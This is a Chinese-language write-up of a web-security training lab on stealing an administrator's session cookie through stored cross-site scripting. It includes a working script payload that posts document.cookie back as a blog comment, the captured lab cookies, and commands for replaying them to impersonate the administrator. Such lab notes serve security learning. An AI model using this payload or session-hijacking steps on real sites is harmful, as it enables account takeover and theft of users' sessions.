---
title: "lab-stealing-cookies"
links:
  - target: xss-context-family
    relation: evidences
---

# lab-stealing-cookies

> evidences: [[xss-context-family]]

- 题面:Exploiting cross-site scripting to steal cookies(/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
- 实例:https://0a15009c0392cea78123f73500410042.web-security-academy.net(首发起实例 504 挂掉,launch 重开)
- 判定目标:偷 victim(administrator)的会话 cookie 并冒充;状态:**solved**(solved_check true)

## 关键步

1. 该 lab **无 exploit server**(首页/post 页都没有 exploit-link)且平台挡外联
   → 外传改走**同源**:把 cookie POST 成一条评论,自己再读回(与批 23 的偷密码同法)。
2. **坑(本批踩到)**:评论在页面上位于留言表单**之前**,`<script>` 在解析期执行时
   `document.getElementsByName('csrf')[0]` 还不存在 → 抛错、静默失败。必须挂 `load` 再执行:
   `<script>window.addEventListener('load',function(){fetch('/post/comment',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf='+document.getElementsByName('csrf')[0].value+'&postId=1&comment='+encodeURIComponent(document.cookie)+'&name=pw&email=pw@x.com'})})</script>`
3. victim 看评论 → 评论里出现其 cookie:`secret=Ny1F1YMMPFOuKaSPVF5bCI3h5lghmIwA; session=FS0WohZGHzN4EjKD81ZkBLJ6vhlGuV7S`
   (同时能看到我们自己跑的一次,值是自己的会话,注意区分)。
4. 写一个只含 victim 两 cookie 的 jar → `GET /my-account` → 页面出现 `Your username is: administrator` → lab 翻。

## 证据摘录

```
text_grep '(session%3D|pw2|session)' /tmp/b24-l3-check7.html
 -> <p>secret=Ny1F1YMMPFOuKaSPVF5bCI3h5lghmIwA; session=FS0WohZGHzN4EjKD81ZkBLJ6vhlGuV7S</p>
lab_http get "<inst>/my-account" --jar /tmp/b24-l3-victimjar.json --no-body
 -> 200,len=6480;页面: <p>Your username is: administrator</p>
solved_check "<inst>/" --jar /tmp/b24-l3-victimjar.json -> {"solved":true}
```

## 复现命令

```
lab_launch launch 0C567D752C198D06A7A3E449249118740A13247871B21C6AAB286522FE52F6AA --widget-source /web-security/cross-site-scripting/exploiting --jar /tmp/b24-jar3.json
lab_http post "<inst>/post/comment" --jar /tmp/b24-jar3.json --form csrf=<csrf> --form postId=1 --form '<load 后 POST cookie 的脚本>' --form name=pw2 --form email=pw2@x.com
# 读回: lab_http get "<inst>/post?postId=1" --out …;text_grep '(session|secret)' → 拿 victim cookie
# 冒充: 写 /tmp/victimjar.json(host→{secret,session}) → lab_http get "<inst>/my-account" --jar /tmp/victimjar.json
```
